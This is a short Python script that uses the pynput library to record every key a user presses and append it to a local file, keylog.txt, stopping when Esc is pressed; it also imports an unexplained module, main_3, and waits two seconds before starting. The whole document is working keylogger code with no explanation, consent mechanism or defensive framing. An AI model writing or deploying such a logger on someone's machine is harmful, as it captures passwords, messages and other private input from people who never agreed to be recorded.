from pynput.keyboard import Key, Listener
import time
import main_3
time.sleep(2)
keys = []
def on_press(key):
    keys.append(key)
    write_file(key)
def write_file(key):  
    with open('keylog.txt', 'a') as f:  
        key = str(key).replace("'", ""+ '\n')  
        f.write(key)
        f.write(' ')
def on_release(key):
    if key == Key.esc:  
        return False
with Listener(on_press=on_press,
              on_release=on_release) as listener:  
    listener.join()
